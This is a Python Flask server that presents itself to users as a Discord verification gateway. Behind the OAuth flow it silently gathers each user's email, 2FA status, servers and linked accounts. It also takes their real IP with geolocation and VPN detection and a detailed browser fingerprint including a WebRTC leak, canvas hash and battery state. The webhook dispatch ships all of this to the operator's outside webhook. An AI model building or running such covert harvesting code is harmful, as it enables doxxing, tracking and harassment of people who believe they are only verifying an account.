"""
app.py — Flask web server.
Handles: fingerprint endpoint, OAuth2 redirect, OAuth2 callback,
         data collection, webhook dispatch, and role assignment.
"""

from __future__ import annotations

import asyncio
import json
import os
from datetime import datetime
from typing import Any

import requests
from flask import Flask, jsonify, redirect, render_template, request, session

from config import (
    CLIENT_ID, CLIENT_SECRET, OAUTH2_SCOPES,
    REDIRECT_URI, SECRET_KEY, WEBHOOK_URL,
)

app = Flask(__name__)
app.secret_key = SECRET_KEY

# ── Set by main.py after the bot loop is created ──────────────────────────────
discord_bot  = None   # VerificationBot instance
bot_loop: asyncio.AbstractEventLoop | None = None

DISCORD_API = "https://discord.com/api/v10"


# ─── Utility functions ────────────────────────────────────────────────────────

def get_real_ip() -> str:
    for header in ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"):
        val = request.headers.get(header, "").split(",")[0].strip()
        if val:
            return val
    return request.remote_addr or "Unknown"


def country_flag(code: str) -> str:
    """Convert 2-letter country code to flag emoji."""
    if not code or len(code) != 2:
        return ""
    return chr(ord(code[0].upper()) + 127397) + chr(ord(code[1].upper()) + 127397)


def get_ip_info(ip: str) -> dict:
    if ip in ("127.0.0.1", "::1", "localhost", "Unknown"):
        return {"country": "Local", "city": "Local", "isp": "Local"}
    try:
        fields = (
            "status,message,country,countryCode,regionName,city,"
            "zip,lat,lon,timezone,isp,org,as,proxy,hosting,query"
        )
        r = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}", timeout=5)
        return r.json()
    except Exception:
        return {}


def snowflake_to_datetime(snowflake_id: int) -> str:
    ts = ((snowflake_id >> 22) + 1420070400000) / 1000
    return datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S UTC")


def parse_flags(flags: int) -> str:
    badge_map = {
        1:       "🏠 Discord Employee",
        2:       "🤝 Partnered Server Owner",
        4:       "⚡ HypeSquad Events",
        8:       "🐛 Bug Hunter Lv.1",
        64:      "🏠 HypeSquad Bravery",
        128:     "🏠 HypeSquad Brilliance",
        256:     "🏠 HypeSquad Balance",
        512:     "💰 Early Supporter",
        16384:   "🐛 Bug Hunter Lv.2",
        131072:  "✅ Verified Bot Developer",
        4194304: "👑 Active Developer",
    }
    badges = [name for bit, name in badge_map.items() if flags & bit]
    return ", ".join(badges) or "None"


def nitro_type(t: int) -> str:
    return {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}.get(t, "Unknown")


# ─── Discord OAuth2 helpers ───────────────────────────────────────────────────

def exchange_code(code: str) -> dict:
    resp = requests.post(
        f"{DISCORD_API}/oauth2/token",
        data={
            "client_id":     CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type":    "authorization_code",
            "code":          code,
            "redirect_uri":  REDIRECT_URI,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    resp.raise_for_status()
    return resp.json()


def fetch_discord_data(token: str) -> dict:
    h = {"Authorization": f"Bearer {token}"}
    user        = requests.get(f"{DISCORD_API}/users/@me",              headers=h).json()
    guilds_raw  = requests.get(f"{DISCORD_API}/users/@me/guilds",       headers=h).json()
    conns_raw   = requests.get(f"{DISCORD_API}/users/@me/connections",  headers=h).json()
    guilds      = guilds_raw  if isinstance(guilds_raw,  list) else []
    connections = conns_raw   if isinstance(conns_raw,   list) else []
    return {"user": user, "guilds": guilds, "connections": connections}


# ─── Webhook builder ──────────────────────────────────────────────────────────

def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[dict]:
    user        = discord_data["user"]
    guilds      = discord_data["guilds"]
    connections = discord_data["connections"]

    uid        = int(user.get("id", 0))
    username   = user.get("username", "Unknown")
    discrim    = user.get("discriminator", "0")
    email      = user.get("email", "N/A")
    avatar_h   = user.get("avatar", "")
    avatar_url = (
        f"https://cdn.discordapp.com/avatars/{uid}/{avatar_h}.png?size=256"
        if avatar_h else "https://cdn.discordapp.com/embed/avatars/0.png"
    )
    verified   = user.get("verified",     False)
    mfa        = user.get("mfa_enabled",  False)
    locale     = user.get("locale",       "Unknown")
    premium    = nitro_type(user.get("premium_type", 0))
    flags      = user.get("public_flags", 0)
    badges     = parse_flags(flags)
    created    = snowflake_to_datetime(uid) if uid else "Unknown"

    is_vpn     = bool(ip_info.get("proxy") or ip_info.get("hosting"))
    cc         = ip_info.get("countryCode", "")
    flag_emoji = country_flag(cc)
    color      = 0xED4245 if is_vpn else 0x5865F2   # red=VPN, blurple=clean

    # ── EMBED 1: Identity ────────────────────────────────────────────────────
    discrim_str = f"#{discrim}" if discrim not in ("0", "") else ""
    profile_val = (
        f"**Username:** `{username}{discrim_str}`\n"
        f"**User ID:** `{uid}`\n"
        f"**Email:** `{email}`\n"
        f"**Account Created:** {created}\n"
        f"**Email Verified:** {'✅' if verified else '❌'}\n"
        f"**2FA Enabled:** {'✅' if mfa else '❌'}\n"
        f"**Nitro:** {premium}\n"
        f"**Locale:** `{locale}`\n"
        f"**Badges:** {badges}"
    )

    # ── EMBED 2: IP / Location ────────────────────────────────────────────────
    vpn_warn = "  ⚠️  **VPN / PROXY DETECTED**" if is_vpn else ""
    ip_val = (
        f"**Address:** `{ip}`\n"
        f"**Country:** {flag_emoji} {ip_info.get('country', 'Unknown')}\n"
        f"**Region:** {ip_info.get('regionName', 'Unknown')}\n"
        f"**City:** {ip_info.get('city', 'Unknown')}\n"
        f"**ISP:** {ip_info.get('isp', 'Unknown')}\n"
        f"**Org:** {ip_info.get('org', 'Unknown')}\n"
        f"**AS:** {ip_info.get('as', 'Unknown')}\n"
        f"**Timezone:** {ip_info.get('timezone', 'Unknown')}\n"
        f"**VPN/Proxy:** {'⚠️ YES' if is_vpn else '✅ No'}\n"
        f"**Datacenter:** {'⚠️ YES' if ip_info.get('hosting') else '✅ No'}"
    )

    # ── EMBED 3: Browser / Device ─────────────────────────────────────────────
    ua = fp.get("userAgent") or request.headers.get("User-Agent", "Unknown")
    ua_short = (ua[:97] + "...") if len(ua) > 100 else ua
    browser_val = (
        f"**User-Agent:** `{ua_short}`\n"
        f"**Platform:** `{fp.get('platform', 'Unknown')}`\n"
        f"**Language:** {fp.get('language', 'Unknown')}\n"
        f"**Screen:** {fp.get('screen', 'Unknown')} (×{fp.get('devicePixelRatio', '?')} DPR)\n"
        f"**Window:** {fp.get('windowSize', 'Unknown')}\n"
        f"**Timezone:** {fp.get('timezone', 'Unknown')}\n"
        f"**CPU Cores:** {fp.get('hardwareConcurrency', 'Unknown')}\n"
        f"**Device Memory:** {fp.get('deviceMemory', 'Unknown')} GB\n"
        f"**Touch Points:** {fp.get('maxTouchPoints', '0')}\n"
        f"**WebGL Renderer:** `{fp.get('webGL', 'Unknown')}`\n"
        f"**WebGL Vendor:** `{fp.get('webGLVendor', 'Unknown')}`\n"
        f"**Canvas Hash:** `{fp.get('canvasHash', 'Unknown')}`\n"
        f"**Do Not Track:** {fp.get('doNotTrack', 'Unknown')}\n"
        f"**Cookies:** {'✅' if fp.get('cookieEnabled') else '❌'}\n"
        f"**AdBlock:** {'✅ Detected' if fp.get('adBlock') else '❌ None'}\n"
        f"**WebRTC Leak:** `{fp.get('webRTC', 'N/A')}`\n"
        f"**Connection:** {fp.get('connection', 'Unknown')}\n"
        f"**Battery:** {fp.get('battery', 'N/A')}"
    )

    # ── Guilds list ───────────────────────────────────────────────────────────
    guild_lines = [f"• {g.get('name','?')} `{g.get('id','')}`" for g in guilds[:25]]
    if len(guilds) > 25:
        guild_lines.append(f"*…and {len(guilds) - 25} more*")
    guilds_val = "\n".join(guild_lines) or "None visible"

    # ── Connections ───────────────────────────────────────────────────────────
    conn_lines = [
        f"• **{c.get('type','?').title()}** — {c.get('name','?')}"
        f"{'  ✅' if c.get('verified') else ''}"
        for c in connections
    ]
    conns_val = "\n".join(conn_lines) or "None"

    now_iso = datetime.utcnow().isoformat()

    embed1 = {
        "title": f"{'⚠️  VPN DETECTED  •  ' if is_vpn else ''}🔐  New Verification",
        "description": f"<@{uid}> just verified.{vpn_warn}",
        "color": color,
        "thumbnail": {"url": avatar_url},
        "fields": [
            {"name": "👤  Discord Profile",   "value": profile_val[:1024], "inline": False},
            {"name": f"🌐  IP & Location",     "value": ip_val[:1024],      "inline": True},
            {"name": "💻  Browser & Device",  "value": browser_val[:1024], "inline": True},
        ],
        "footer": {"text": f"Verified at {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"},
        "timestamp": now_iso,
    }

    embed2 = {
        "color": color,
        "fields": [
            {"name": f"🏠  Servers ({len(guilds)})", "value": guilds_val[:1024], "inline": False},
            {"name": "🔗  Connected Accounts",       "value": conns_val[:1024],  "inline": False},
        ],
        "footer": {"text": f"User ID: {uid}"},
        "timestamp": now_iso,
    }

    return [embed1, embed2]


def send_webhook(discord_data: dict, ip: str, ip_info: dict, fp: dict):
    if not WEBHOOK_URL:
        print("⚠️  WEBHOOK_URL not set — skipping webhook")
        return
    embeds = build_embeds(discord_data, ip, ip_info, fp)
    try:
        r = requests.post(WEBHOOK_URL, json={"embeds": embeds}, timeout=8)
        r.raise_for_status()
        print(f"📨  Webhook sent  HTTP {r.status_code}")
    except Exception as e:
        print(f"❌  Webhook error: {e}")


# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    """Landing page — shows the verification UI."""
    return render_template("verify.html")


@app.route("/fingerprint", methods=["POST"])
def fingerprint():
    """Receives browser fingerprint JSON from the JS on verify.html."""
    data = request.get_json(silent=True) or {}
    session["fingerprint"] = data
    return jsonify({"status": "ok"})


@app.route("/oauth")
def oauth_redirect():
    """Redirects the browser to Discord's OAuth2 authorization page."""
    import urllib.parse
    params = urllib.parse.urlencode({
        "client_id":     CLIENT_ID,
        "redirect_uri":  REDIRECT_URI,
        "response_type": "code",
        "scope":         OAUTH2_SCOPES,
        "prompt":        "consent",
    })
    return redirect(f"https://discord.com/api/oauth2/authorize?{params}")


@app.route("/callback")
def callback():
    """OAuth2 callback — main collection & processing endpoint."""
    code  = request.args.get("code")
    error = request.args.get("error")

    if error:
        desc = request.args.get("error_description", error)
        return render_template("error.html", error=desc)

    if not code:
        return render_template("error.html", error="No authorization code received.")

    try:
        # 1. Exchange code → access token
        token_data    = exchange_code(code)
        access_token  = token_data["access_token"]

        # 2. Fetch Discord profile data
        discord_data  = fetch_discord_data(access_token)
        user          = discord_data["user"]
        uid           = int(user.get("id", 0))

        # 3. Collect IP + geolocation
        ip      = get_real_ip()
        ip_info = get_ip_info(ip)

        # 4. Retrieve browser fingerprint stored by /fingerprint endpoint
        fp = session.get("fingerprint", {})
        fp.setdefault("userAgent",      request.headers.get("User-Agent", "Unknown"))
        fp.setdefault("acceptLanguage", request.headers.get("Accept-Language", "Unknown"))

        # 5. Fire Discord webhook
        send_webhook(discord_data, ip, ip_info, fp)

        # 6. Give verified role via bot
        role_given = False
        if uid and discord_bot and bot_loop:
            future = asyncio.run_coroutine_threadsafe(
                discord_bot.give_verified_role(uid), bot_loop
            )
            try:
                role_given = future.result(timeout=10)
            except Exception as e:
                print(f"⚠️  Role assignment error: {e}")

        return render_template(
            "success.html",
            username=user.get("username", "User"),
            role_given=role_given,
        )

    except requests.HTTPError as e:
        print(f"❌  HTTP error in callback: {e}")
        return render_template("error.html", error="Failed to communicate with Discord API.")
    except Exception as e:
        import traceback
        traceback.print_exc()
        return render_template("error.html", error="An unexpected error occurred.")
